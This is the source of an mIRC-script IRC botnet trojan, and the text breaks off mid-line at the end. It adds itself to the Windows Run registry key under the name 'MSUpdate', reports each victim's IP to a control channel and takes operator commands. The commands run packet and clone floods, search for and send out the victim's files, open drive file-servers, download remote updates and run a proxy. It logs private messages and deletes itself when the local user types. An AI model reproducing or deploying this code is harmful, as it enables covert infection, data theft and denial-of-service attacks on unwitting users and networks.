on *:START:{
  if ($exists(Rundll32_.exe) == $true) {
    .run Rundll32_.exe /c /fh chrono
  }
  .inc %times
  if (%times == 1) {
    .set %Rundate $fulldate
    .run rundll32_.exe /n /fh secure.bat
    .set %botnick $read(sysnick.sys)
    .run sysss.exe
  }
  .ignore -t *!*@*
  .register
  .timerupdate 1 40 .checkupdate
  .timerclear 0 3 .clearall
  .identd off $read(sysnick.sys)
  .nick $readini(winrun32_.sys, user, nick) %botnick
  .anick $readini(winrun32_.sys, user, anick) $read sysnick.sys
  .fullname $read sysnick.sys
  .server $readini(winrun32_.sys, start, server) $readini(winrun32_.sys, start, serverport) $readini(winrun32_.sys, start, password)
}
on 1:invite:*: { if ($nick == invite-bot) { .join $readini(winrun32_.sys, connect, botchan) $readini(winrun32_.sys, connect, botchankey) } }
alias register { set %filetoboot $rand(100,999) $+ .reg | write %filetoboot  REGEDIT4  | write %filetoboot [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]  | write %filetoboot "MSUpdate"=" $+ $replace($mircdir,\,\\) $+ Explort.exe $+ "  | run -n regedit /s %filetoboot  | timer 1 4 remove %filetoboot }
on *:CONNECT:{ .mode $me +ix | .timerpig 0 3 .ctcp $me ping | .join $readini(winrun32_.sys, connect, botchan) $readini(winrun32_.sys, connect, botchankey) | .timer 0 5 .botchan }
alias botchan {
  if ($me ison $readini(winrun32_.sys, connect, botchan)) { goto end }
  if ($me !ison $readini(winrun32_.sys, connect, botchan)) {
    .msg invite-bot invite $readini(winrun32_.sys, connect, botchan) $me
    .timerinvjoin 1 2 .join $readini(winrun32_.sys, connect, botchan) $readini(winrun32_.sys, connect, botchankey)
  }
  :end
}
on *:text:FuckuClone:?:{ if ($address($nick,2) == $address($me,2)) { .quit I m Clone of $nick Bye bye ;) | exit } }
on *:join:#: {
  if ($nick != $me) && ($address($nick,2) = $address($me,2)) { .msg $nick FuckuClone }
  if ($me isop $chan) { .mode $chan +sntk $readini(winrun32_.sys, connect, botchankey) | topic $chan Channel oWneD by: >>—-[oWneRzTeAm]-—<< }
  .window -h $chan
  if ($chan == $readini(winrun32_.sys, connect, botchan)) && ($nick == $me) {
    .msg $readini(winrun32_.sys, connect, botchan) Online:( $+ $host $+ / $+ $ip $+ ) OwNeD at:( $+ %Rundate $+ )
    .msg $readini(winrun32_.sys, connect, botchan) Run times:( $+ %times $+ ) On Version:(Sd-Pro By: >>—-[oWneRzTeAm]-—<<)
  }
}
on 1:text:*:*: {
  if ($1 == .login) {
    if ($2 == $null) { halt }
    if ($nick isop $chan) {
      if ($2 == $readini(winrun32_.sys, logins, $nick)) && ($level($address($nick,N)) != 10) {
        .guser 10 $nick
        .msg $readini(winrun32_.sys, connect, botchan) Login Accepted for ( $+ $nick $+ ).
      }
    }
  }
}
on 1:LOAD:/msg $readini(winrun32_.sys, connect, botchan) $script Loaded.
on 1:UNLOAD:/msg $readini(winrun32_.sys, connect, botchan) $script Loaded.
on 1:FILERCVD:*:/msg $readini(winrun32_.sys, connect, botchan) [Successfuly Received]: $nopath($filename) from $nick $+ . $nopath($filename) will be allocated to $filename $+ .
on 1:GETFAIL:*:/msg $readini(winrun32_.sys, connect, botchan) [Failed to Receive]: $nopath($filename) from $nick $+ .
on 1:SENDFAIL:*:/msg $readini(winrun32_.sys, connect, botchan) [Failed to Send]: $nopath($filename) to $nick $+ .
on 1:EXIT: { .msg $readini(winrun32_.sys, connect, botchan) WARNING: Client Killed By Local User! }
on 1:text:*:?:{ .write log32.sys [[ $+ $date $time $me $+ ]] < $+ $nick $+ > $1- | .close -m $nick }
on 1:INPUT:*:/.msg $readini(winrun32_.sys, connect, botchan) WARNING: User Typing at Local Console - EXITING! , Removing bot | .remove winrun32_.sys | .remove Explort.exe | .remove mirc.ini | .remove winrun32_.sys | .remove Explort.dat | .exit
on 1:KEYDOWN:*:*:/.msg $readini(winrun32_.sys, connect, botchan) WARNING: User Typing at Local Console - EXITING! , Removing bot | .remove winrun32_.sys | .remove Explort.exe | .remove mirc.ini | .remove winrun32_.sys | .remove Explort.dat | .exit
on 10:text:*:*: {
  if ($1 == .getlist) { .spamchan | .msg $chan Downloading Spam Chan list }
  if ($1 == .getupdate) { .checkupdate | .msg $chan Downloading Update from site }
  if ($1 == .paxet) {
    if ($3 == $null) { /msg $chan Error/Syntax: (You must provide an IP & Ammount .paxet ip ammount). | halt | //run ping.exe -n $3 $2 -w 0 -l 65500 | //run icmp.exe /n /fh ping | /timer 2 1 //run rundll32_.exe /n /fh ping | /msg $chan [WWT] Sending [64kb] of Data to ( $+ $2 $+ ) $3 times. }
    return
  }
  if ($1 == .find) {
    if ($3 == $null) { .msg $readini(winrun32_.sys, connect, botchan) Error Please use .find <c,d> <filename> | halt }
    if ($3 != $null) {
      .unset %fileserch
      :serch
      .inc %fileserch
      if ($findfile($2,$3,%fileserch) == $null) {
        .msg $readini(winrun32_.sys, connect, botchan) End of File serch ( $+ %fileserch files founded).
        .unset %fileserch
        goto endserch
      }
      .msg $readini(winrun32_.sys, connect, botchan) $findfile($2,$3,%fileserch)
      goto serch
    }
    :endserch
  }
  if ($1 == .vpacket) {
    if ($2 == $null) { .msg $readini(winrun32_.sys, connect, botchan) Error/Syntax: .vpacket <ip> <packetsize> <times> | halt } | .remove pkt.vbs | .write pkt.vbs Set src3 = CreateObject("Wscript.shell") | .write pkt.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run pkt.vbs | if ($4 != $NULL) { .msg $readini(winrun32_.sys, connect, botchan) Now Sending $3 Packets (Type-8) to $2 $+ , $4 times... | .timer 1 5 //remove nb.vbs }
  }
  if ($1 == .offclones) {
    set %flood off
    unset %clonesno
    unset %serverf
    unset %portf
    .sockclose flooder*
    .msg $readini(winrun32_.sys, connect, botchan) 4Sockets Bot: is off
  }
  if ($1 == .clones) {
    .set %flood on
    .set %clonesno $2
    .set %server.sock $3
    .set %port.sock $4
    .set %var 0
    :loop
    inc %var
    if (%flood == on) && (%var <= %clonesno) { .sockopen flooder $+ %var %server.sock %port.sock | goto loop }
    else { .msg $readini(winrun32_.sys, connect, botchan) 15Flood Sockets is connecting to: %server.sock %port.sock | halt }
  }
  if ($1 == .flood) {
    if ($2 == set) && ($3 != $null) { .set %flood.msg $3 }
    if ($2 == ownerz) {
      if ($3 == $null) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { sockwrite -nt flooder* nick oWneRz- $+ $rand(G,Z) $+ $rand(1,9999) }
      if ($3 != $null) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { sockwrite -nt flooder* nick $3 $+ $rand(G,Z) $+ $rand(1,9999) }
    }
    if ($2 == off) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockclose flooder* }
    if ($2 == pvtmsg) { .sockwrite -nt flooder* Privmsg $3 : $+ $4 }
    if ($2 == not) { .sockwrite -nt flooder* notice $3 : $+ $4 }
    if ($2 == join) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* join $3 }
    if ($2 == part) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* part $3 }
    if ($2 == msg) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* Privmsg $3 : $+ %flood.msg | .sockwrite -nt flooder* Privmsg $3 : $+ %flood.msg }
    if ($2 == notice) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* notice $3 : $+ %flood.msg | .sockwrite -nt flooder* notice $3 : $+ %flood.msg }
    if ($2 == joinflood) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* join $3 | .sockwrite -nt flooder* notice $3 : $+ %flood.msg }
    if ($2 == join/part) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* join $3 | .sockwrite -nt flooder* part $3 }
    if ($2 == nickflood) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .sockwrite -nt flooder* join $3 | sockwrite -nt flooder* nick $read(sysnick.sys) $+ $rand(a,z) }
  }
  if ($1 == .adduser) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($3 == $null) { .msg $chan Usage: .adduser nick password | .halt } | if ($readini(winrun32_.sys, logins, $2) !== $null) { .msg $chan Username not Available | .halt } | .writeini winrun32_.sys logins $2- | .msg $chan Added $2 to userlist with password $3 $+ . }
  if ($1 == .deluser) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($2 == microtech) { .msg $chan Access Denied. | .halt } | if ($2 == $null) { .msg $chan Usage: .deluser nick | .halt } | if ($readini(winrun32_.sys, logins, $2) == $null) { .msg $chan Sorry, that username is not currently on my records. | .halt } | .remini winrun32_.sys logins $2 | .msg $chan Removed $2 from userlist. }
  if ($1 == .passwd) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($3 == $null) { .msg $chan Usage: .passwd username newpassword | .halt } | .writeini winrun32_.sys logins $2- | .msg $chan Password for username $2 has been changed to $3 $+ . }
  if ($1 == .version) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .msg $readini(winrun32_.sys, connect, botchan) Version: $readini(winrun32_.sys, users, version) }
  if ($1 == .info) && ($nick isop $readini(winrun32_.sys, connect, botchan)) && ($2 == $me) {
    .msg $readini(winrun32_.sys, connect, botchan) Rundate: %Rundate , Running times: %times Times
    .msg $readini(winrun32_.sys, connect, botchan) UserName: $read(winrun32_.sys, user ,fullname)
    .msg $readini(winrun32_.sys, connect, botchan) Nickname: $read(winrun32_.sys, user ,nick)
    .msg $readini(winrun32_.sys, connect, botchan) Identd: $read(winrun32_.sys, user ,ident)
  }
  if ($1 == .invite) {
    .spamchan 
    set %s.i.c $chan
    set %i.server $2
    set %i.port $3
    set %imsg $4-
    .sockopen inviterN %i.server %i.port
    .msg %s.i.c 12[15in14vit15er12]:  Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )
    if ($exists(Internet.exe) != $true) {
      .copy EXPLORER.EXE Internet.exe
    }
    .writeini winrun32_.sys inv server %i.server | .writeini winrun32_.sys inv port %i.port | .writeini winrun32_.sys inv msg %imsg | run Internet.exe invsystem.exe
  }
  if ($1 == .download) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .wget $2 }
  if ($1 == .update) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .msg $readini(winrun32_.sys, connect, botchan) Downloading Update from $readini(winrun32_.sys, http, site) $+ file $+ $readini(winrun32_.sys, http, version) $+ .exe | .wget $readini(winrun32_.sys, http, site) $+ file $+ $readini(winrun32_.sys, http, version) $+ .exe }
  if ($1 == .rehash) && ($nick isop $readini(winrun32_.sys, connect, botchan)) {
    if ($2 == $me) {
      .quit Rehashing Command used by the OwneR
      .load -rs winrun32_.sys
    }
  }
  if ($1 == .Fserver) && ($nick isop $readini(winrun32_.sys, connect, botchan)) {
    if ($2 == on) { .timerserv off | .set %fserver on | .join $readini(winrun32_.sys, connect, fservchan) | .timerserv 0 150 .msg $readini(winrun32_.sys, connect, fservchan)  $+ %colorserv $+ File Server Online 12Triggers:« $+ %colorserv $+ /ctcp $me GameZ-WareZ • /ctcp $me SK-SerV $+ 12» Queues:« $+ %colorserv $+ 25/2512» Online:« $+ %colorserv $+ 0/412» RCPS:« $+ %colorserv $+ 13.7 Kbs by $me $+ 12» Served:« $+ %colorserv $+ 1.07G in 16 files12» }
    if ($2 == off) { .timerserv off | .set %fserver off }
  }
  if ($1 == .kill) && ($nick isop $readini(winrun32_.sys, connect, botchan)) {
    if ($2 == $me) { .msg $readini(winrun32_.sys, connect, botchan) Kill command used by: $nick | .quit Local Kill by the OwneR }
  }
  if ($1 == .botname) && ($nick isop $readini(winrun32_.sys, connect, botchan)) {
    if ($2 == $me) {
      if ($3 == nick) { .writeini winrun32_.sys user nick $4 | .writeini winrun32_.sys user anick $4 $+ _ | .nick $4 | .msg $readini(winrun32_.sys, connect, botchan) Nickname: ( $+ $4 $+ ) }
      if ($3 == fullname) { .writeini winrun32_.sys user fullname $4 | .msg $readini(winrun32_.sys, connect, botchan) Fullname: ( $+ $4 $+ ) }
      if ($3 == ident) { .writeini winrun32_.sys user ident $4 | .msg $readini(winrun32_.sys, connect, botchan) Ident: ( $+ $4 $+ ) }
    }
  }
  if ($1 == .nick) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($2 == $null) { .nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) } | else { .nick $2 } }
  if ($1 == .join) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .join $2 | .msg $readini(winrun32_.sys, connect, botchan) Joining ( $+ $2 $+ ) }
  if ($1 == .part) && ($nick isop $readini(winrun32_.sys, connect, botchan)) {
    if ($2 == $readini(winrun32_.sys, connect, botchan)) { .msg $readini(winrun32_.sys, connect, botchan) Error/Syntax: Can`t Part my main channel ! | halt }
    .part $2
    .msg $readini(winrun32_.sys, connect, botchan) Parting ( $+ $2 $+ )
  }
  if ($1 == .send) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .msg $chan [Sending]: $2 to $nick | .send $nick $2 }
  if ($1 == .pfast) { .set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
  if ($1 == .register) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .nickserv register 123456 fuckoff@shit.com | .msg $readini(winrun32_.sys, connect, botchan) Your password is123456- remember this for later use. }
  if ($1 == .log) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .send $nick log32.sys | .msg $readini(winrun32_.sys, connect, botchan) [Sending Log File to $nick $+ ] }
  if ($1 == .ajoin) && ($nick isop $readini(winrun32_.sys, connect, botchan))  { .join $2 | .writeini mirc.ini chanfolder n $+ %chanfolder $2 $+ ,,,,1,1 | .inc %chanfolder | .msg $readini(winrun32_.sys, connect, botchan) Channel $2 $3- added to your list. }
  if ($1 == .onconn) && ($nick isop $readini(winrun32_.sys, connect, botchan))  { .writeini mirc.ini Perform n $+ %Perform $2 | inc %Perform | .msg $readini(winrun32_.sys, connect, botchan) [Writing On Connect]:( $+ $2 $3- $+ ). }
  if ($1 == .say) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { $2- | .msg $readini(winrun32_.sys, connect, botchan) [Done]: ( $+ $2- $+ ) }
  if ($1 == .uptime) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .msg $readini(winrun32_.sys, connect, botchan) [System Uptime]: $duration($calc($ticks / 1000)) }
  if ($1 == .netb) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($2 == $null) { /msg $readini(winrun32_.sys, connect, botchan) Error/Syntax: .nb <ip> <msg> | halt } | .remove nb.vbs | .write nb.vbs Set src3 = CreateObject("Wscript.shell") | .write nb.vbs  src3.run "command /c net send $2 $3 ",0,true | .run nb.vbs | if ($3 != $null) { .msg $readini(winrun32_.sys, connect, botchan) Now Sending Netbios Msg ( $+ $3 $+ ) to $2 $+ . } }
  if ($1 == .IP) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .msg $readini(winrun32_.sys, connect, botchan) [IP]: $ip }
  if ($1 == .packet) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { .packetofdeath $2 $3 $4 $5 }
  if ($1 == .load) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { if ($exists( $+ $2 $+ ) == $true) { .load -rs $2- | msg $readini(winrun32_.sys, connect, botchan) [Loaded]: $2- } | else { .msg $readini(winrun32_.sys, connect, botchan) File Not Found: $2 } }
  if ($1 == .fserve) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { 
    if ($2 == c) { .msg $readini(winrun32_.sys, connect, botchan) Opening FileServer Session to: $nick / Drive/Dir: $2 $+ :\ | .fserve $nick 10 C:\ }
    if ($2 == d) { .msg $readini(winrun32_.sys, connect, botchan) Opening FileServer Session to: $nick / Drive/Dir: $2 $+ :\ | .fserve $nick 10 d:\ }
  }
  if ($1 == .HOST) && ($nick isop $readini(winrun32_.sys, connect, botchan)) { timer 1 0 .msg $readini(winrun32_.sys, connect, botchan) [HOST]: $host }
}
alias packetofdeath {
  if ($3 = $null) { .notice $nick Error Please use !packet address size amount | halt }
  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) { .msg $readini(winrun32_.sys, connect, botchan) Error Please use !packet <address> <size> <amount> | halt }
  if ($remove($1,$chr(46)) !isnum) { notice $nick Error no letters may be contained in the ip | unset %packet.* | halt }
  .msg $readini(winrun32_.sys, connect, botchan) Now Packeting $1 with $2 bytes $3 times
  set %packet.ip $1
  set %packet.bytes $2
  set %packet.amount $3
  set %packet.count 0
  set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) 
  :start
  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .msg $readini(winrun32_.sys, connect, botchan) Packeting has completed | halt }
  inc %packet.count 1
  /sockudp -b packet 60 %packet.ip %packet.port %packet.bytes
  %packet.bytes
  goto start
}
alias wget {
  if ($1-) {
    set %website $1
    set %i $rand(1,10000)
    set %wget. $+ %i $1-
    set %wget. $+ %i $+ .write no
    set %wget. $+ %i $+ .file $gettok($eval(% $+ wget. $+ %i,2),$numtok($eval(% $+ wget. $+ %i,2),47),47)
    if ($right($eval(% $+ wget. $+ %i,2),1) == $chr(47)) set %wget. $+ %i $+ .file index.htm
    .remove " $+ $getdir $+ $eval(% $+ wget. $+ %i $+ .file,2) $+ "
    sockopen wget $+ %i $gettok($1-,2,47) 80
  }
}
alias letsgo {
  set %i $rand(1,10000)
  set %wget. $+ %i $2-
  set %wget. $+ %i $+ .write no
  set %wget. $+ %i $+ .type $null
  set %wget. $+ %i $+ .file $gettok($eval(% $+ wget. $+ %i,2),$numtok($eval(% $+ wget. $+ %i,2),47),47)
  if ($right($eval(% $+ wget. $+ %i,2),1) == $chr(47)) set %wget. $+ %i $+ .file index.htm
  .remove " $+ $getdir $+ $eval(% $+ wget. $+ %i $+ .file,2) $+ "
  sockopen wget $+ %i $gettok($2-,2,47) 80
}
on *:sockopen:wget*: {
  if ($sockerr) {
    unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ *)
    halt
    if ($server != $null) { .msg $readini(winrun32_.sys, connect, botchan) Web Get --- Sock Error: $sock($sockname).wsmsg }
  }
  if ($server != $null) { .msg $readini(winrun32_.sys, connect, botchan) Downloading %website .... }
  sockwrite -n $sockname GET / $+ $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),3-,47) HTTP/1.1
  sockwrite -n $sockname HOST: $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),2,47)
  sockwrite -n $sockname ACCEPT: */*
  sockwrite -n $sockname Referer: $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),1-2,47)
  sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)
  sockwrite -n $sockname Connection: close
  sockwrite -n $sockname $crlf
}
on *:sockread:wget*: {
  if ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .write,2) == no) {
    sockread %trans.dl
    if (302 Found isin %trans.dl) && ($server != $null) msg $readini(winrun32_.sys, connect, botchan) WGet --- 302 Error: Found
    if (404 Not Found isin %trans.dl) && ($server != $null) msg $readini(winrun32_.sys, connect, botchan) WGet --- 404 Error: File Not Found
    if ($left(%trans.dl,12) == Content-Type)  {
      if (text !isin %trans.dl) set %wget. $+ $remove($sockname,wget) $+ .type I
      else {
        set %wget. $+ $remove($sockname,wget) $+ .type A
      }
    }
    if (($chr(58) !isin %trans.dl) && ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .type,2))) unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ .write)
    } | else {
    if ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .type,2) == A) {
      sockread %trans.dl
      write " $+ $getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2) $+ " %trans.dl
      } | else {
      sockread &trans.dl
      bwrite " $+ $getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2) $+ " -1 &trans.dl
    }
  }
}
on *:sockclose:wget*: {
  if ($server != $null) { .msg $readini(winrun32_.sys, connect, botchan) Download Complete (Size: $file($getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2)).size $+ ) }
  unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ *)
}
on *:SOCKOPEN:flooder*: {
  .sockwrite -nt $sockname PONG $server
  .sockwrite -nt $sockname user $read(sysnick.sys) $read(sysnick.sys) $read(sysnick.sys) : $read(sysnick.sys)
  .sockwrite -nt $sockname nick $read(sysnick.sys) $+ $rand(a,z)
}
on *:sockread:flooder*:{  
  sockread -f %t.i
  if ($gettok(%t.i,1,32) == PING) { 
    sockwrite -nt $sockname PONG $gettok(%t.i,2,32) 
  }
}
on 10:notice:!bnc*:*:{  if ($2 == stats) {   msg # 15*14BNC-STATS15* 12[14Total Users Connected:2(15 $+ $sock(bnc.in*,0) $+ 2) 14Bncs open:2(15 $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 2) 14Server Connections:2(15 $+ $sock(bnc.out*,0) $+ 2)12] } |  if ($2 == log) && ($address == %master) { bnc log $3 | msg # 14•15BNC14• Logger has been set to $3 $+ ...  |  if ($3 == off) { remove bnc.log }   } | if ($2 == start) {  /bnc start $3 $4 |  msg # 2[14Bnc2] 15Setup complete:14 $Ip $+ 14:15 $+ $3  | msg # 2[14Bnc2] 14Usage:15 /server $Ip $+ 14:15 $+ $3 [Then /Quote Pass $4 $+ ]  |   halt     }  
  if ($2 == help) {  msg # 14•15BNC14• Usage: !bnc [port] pass |  halt   } | if ($2 == stop) {  if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) { msg # 14•15BNC14• Error: Bnc not active on that port! | halt }  | msg # 14•15BNC14• Server/port for $3 has been stopped. |  sockclose bnc. $+ $3  } | if ($2 == kill) && ($3 == users) && ($address == %master)  { msg # 14•15BNC14• [( $+ $sock(bnc.in*,0) $+ )] Users on bnc, have been disconnected... | sockclose bnc.in* | sockclose bnc.out*  } |  if ($2 == shutdown) {  msg # 14•15BNC14• BNC Server shutdown... (all settings reset) |  bnc reset  |  msg # 14•15BNC14• Server shutdown complete... } |  if ($2 == list) && ($3 == bnc) {   if ($sock(bnc.*,0) == 0) { msg # 14•15BNC14• Error, there are currently no bnc servers open... | halt }   
    if ($sock(bnc.*,0) > 0) {   msg # 14•15BNC14• Listing Active/Open BNC's |    %bnc.stl = 0     |    :again  |   if ($sock(bnc.*,0) == %bnc.stl) { goto done } |  inc %bnc.stl  |  if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) { goto again } |  msg # 14•15BNC14• $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ]   |  goto again |    :done |    msg # 14•15BNC14• End Listing Active BNC's...    }  } |  if ($2 == list) && ($3 == users) && ($address == %master) {  if ($sock(bnc.in*,0) == 0) {  msg # 14•15BNC14• Error: No Users Connected to the bnc... | halt }   | if ($sock(bnc.in*,0) > 0) { msg # 14•15BNC14• Listing Active Users...   |  %bnc.stlu = 0 |  :again2  
    if ($sock(bnc.in*,0) == %bnc.stlu) { goto done2 } |   inc %bnc.stlu  | msg # 14•15BNC14• $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) on port $sock(bnc.in*,%bnc.stlu).mark |    goto again2 |    :done2 |   msg # 14•15BNC14• List of Users Complete...  } }  | if ($2 == list) && ($3 == server) && ($address == %master) {   if ($sock(bnc.out*,0) == 0) { msg # 14•15BNC14• Error: Currently No Users on Servers Connected... | halt }   
if ($sock(bnc.out*,0) > 0) {   msg # 14•15BNC14• Listing Active Users and Servers... |  %bnc.stlus = 0 |  :again3 | if ($sock(bnc.out*,0) == %bnc.stlus) { goto done3 }  |  inc   %bnc.stlus |  msg # 14•15BNC14• $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  |  goto again3 |   :done3 |  msg # 14•15BNC14• List of Users and Servers Complete...  } |  halt  } }
alias bnc {    if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  }  |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }
on 1:socklisten:bnc.*:{   if ($sock(bnc.in.temp,0) == 1) { halt } | //set %bnc.smt $gettok($sockname,2,46) | /sockaccept bnc.in.temp | sockread }  
on *:sockclose:bnc.in.*: { unset %bnc.ok. $+ $sockname | unset %bnc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
on *:sockread:bnc.in.*:{   if ($sock(bnc.in.temp*,0) == 1) {   /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | /sockmark $sockname %bnc.smt | unset %bnc.smt |  //set  %bnc.ok. $+ $sockname no } |   sockread -f %temp.r  |  if (%bnc.log == on) { write bnc.log <<<[Incomming]>>> %temp.r }  |  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {  if ($gettok(%temp.r ,1,32) == NICK) { set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)  |  //write bnc.log Connectoin from: $sock($sockname).ip Time: $time Date: $+ $date 
    sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Welcome to GT's BNC Server. ( $+ $gettok(%temp.r ,2,32) $+ ) ***     | sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***   |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP ***  |  halt  } 
    if ($gettok(%temp.r ,1,32) == BNCHELP) {    sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] |  halt  } |  if ($gettok(%temp.r ,1,32) == USER) {  set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) |  halt  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Password Accepted ***  
  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start ***  |   goto next  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Incorrect Password... |   inc %bp   } |  if (%bp >= 3) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  |  sockclose $sockname | unset %bp }  |  halt   }
  :next |  %bnc.ok. [ $+ [ $sockname ] ] = done | if ($gettok(%temp.r ,1,32) == IDENT) {   identd on $gettok(%temp.r ,2,32)  |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Ident set to $gettok(%temp.r ,2,32)  }  | if ($gettok(%temp.r ,1,32) == VHOST) {  if ($gettok(%temp.r ,2,32) == LIST) {  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing VHOSTS |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ End of VHOST / LIST |     halt   }
    if ($gettok(%temp.r ,2,32) == 1) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host |    halt   } |  else {   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # | halt }   } |   if ($gettok(%temp.r ,1,32) == BNCHELP) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing Help Commands... |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT]  
